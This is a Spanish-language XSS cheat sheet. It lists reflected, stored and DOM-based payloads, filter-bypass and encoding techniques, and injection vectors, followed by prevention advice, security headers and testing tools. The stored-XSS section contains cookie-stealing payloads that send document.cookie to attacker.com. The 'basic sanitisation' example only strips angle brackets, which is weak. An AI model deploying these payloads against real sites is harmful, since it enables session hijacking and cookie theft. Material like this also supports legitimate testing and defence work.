# Cross-Site Scripting (XSS) Cheat Sheet

## Tipos de XSS

### 1. Reflected XSS
```javascript
// Básico
<script>alert('XSS')</script>

// Usando eventos
<img src="x" onerror="alert('XSS')">
<body onload="alert('XSS')">

// Con codificación
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
```

### 2. Stored XSS
```javascript
// Payload persistente
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>

// Robo de cookies
<script>
new Image().src="http://attacker.com/steal?cookie="+encodeURIComponent(document.cookie);
</script>
```

### 3. DOM-based XSS
```javascript
// Manipulación del DOM
<script>document.write(document.location.hash.substring(1));</script>

// Usando innerHTML
<div id="div"></div>
<script>div.innerHTML=document.location.hash.slice(1)</script>
```

## Técnicas de Bypass

### 1. Bypass de Filtros
```javascript
// Mezclando mayúsculas/minúsculas
<ScRiPt>alert('XSS')</sCrIpT>

// Sin espacios
<img/src="x"onerror=alert('XSS')>

// Usando comentarios HTML
<scr<!---->ipt>alert('XSS')</scr<!---->ipt>
```

### 2. Codificación
```javascript
// URL Encoding
%3Cscript%3Ealert('XSS')%3C/script%3E

// Base64
<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>

// Unicode
\u003Cscript\u003Ealert('XSS')\u003C/script\u003E
```

## Vectores de Ataque Comunes

### 1. Input Fields
```javascript
// En formularios
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
```

### 2. URLs
```javascript
// Parámetros URL
?search=<script>alert('XSS')</script>
?redirect=javascript:alert('XSS')
```

## Prevención

### 1. Validación de Input
```javascript
// Sanitización básica
input = input.replace(/[<>]/g, '');

// Escape de caracteres especiales
input = input.replace(/[&<>"']/g, function(m) {
    return {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;'
    }[m];
});
```

### 2. Headers de Seguridad
```http
Content-Security-Policy: default-src 'self'
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
```

### 3. Buenas Prácticas
- Usar HTML encoding para output
- Implementar CSP (Content Security Policy)
- Validar input en servidor y cliente
- Usar frameworks modernos con protección XSS integrada
- Implementar HttpOnly en cookies
- Mantener bibliotecas actualizadas

## Testing y Detección

### 1. Patrones de Búsqueda
```javascript
// Buscar vulnerabilidades
"><script>
onerror=
onload=
javascript:
data:text/html
```

### 2. Herramientas
- XSS Hunter
- BeEF (Browser Exploitation Framework)
- OWASP ZAP
- Burp Suite (Scanner XSS)
